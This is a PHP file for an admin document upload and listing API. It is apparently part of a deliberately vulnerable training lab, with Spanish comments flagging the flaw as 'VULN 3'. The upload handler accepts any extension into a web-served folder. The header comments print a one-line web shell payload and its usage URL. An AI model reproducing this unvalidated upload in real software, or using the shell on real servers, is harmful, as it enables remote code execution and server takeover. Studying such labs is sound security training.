<?php
// api/documents.php — Subida y listado de documentos (solo administradores)
// ⚠️ VULN 3: Unrestricted File Upload → RCE
// Solo comprueba que el usuario es admin, pero NO valida la extensión del fichero.
// Un atacante puede subir shell.php y luego acceder a /internal/uploads/shell.php
// Payload de shell.php: <?php system($_GET['cmd']); ?>
// Uso: /internal/uploads/shell.php?cmd=whoami
 
session_start();
header("Content-Type: application/json");
require "db.php";
 
if (!isset($_SESSION["user_id"])) {
    http_response_code(401);
    echo json_encode(["error" => "No autenticado"]);
    exit();
}
 
if ($_SESSION["role"] !== "administrator") {
    http_response_code(403);
    echo json_encode(["error" => "Acceso denegado"]);
    exit();
}
 
$upload_dir = __DIR__ . "/../uploads/";
 
// GET → lista documentos subidos
if ($_SERVER["REQUEST_METHOD"] === "GET") {
    $result = $conn->query("
        SELECT d.id, d.original_name, d.filename, d.uploaded_at, u.full_name AS uploaded_by
        FROM documents d
        JOIN users u ON d.uploader_id = u.id
        ORDER BY d.uploaded_at DESC
    ");
    $docs = [];
    while ($row = $result->fetch_assoc()) {
        $docs[] = $row;
    }
    echo json_encode($docs);
    exit();
}
 
// POST → sube un documento
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (!isset($_FILES["document"])) {
        http_response_code(400);
        echo json_encode(["error" => "No se recibió ningún fichero"]);
        exit();
    }
 
    $original = $_FILES["document"]["name"];
    $tmp      = $_FILES["document"]["tmp_name"];
 
    // ⚠️ VULNERABILIDAD: no se valida la extensión ni el MIME type
    // Cualquier fichero es aceptado, incluidos .php
    $filename = uniqid() . "_" . basename($original);
    move_uploaded_file($tmp, $upload_dir . $filename);
 
    $uid = $_SESSION["user_id"];
    $orig_esc = $conn->real_escape_string($original);
    $file_esc = $conn->real_escape_string($filename);
    $conn->query("INSERT INTO documents (uploader_id, filename, original_name) VALUES ($uid, '$file_esc', '$orig_esc')");
 
    echo json_encode([
        "success"  => true,
        "filename" => $filename,
        "url"      => "/internal/uploads/" . $filename
    ]);
    exit();
}
 
$conn->close();
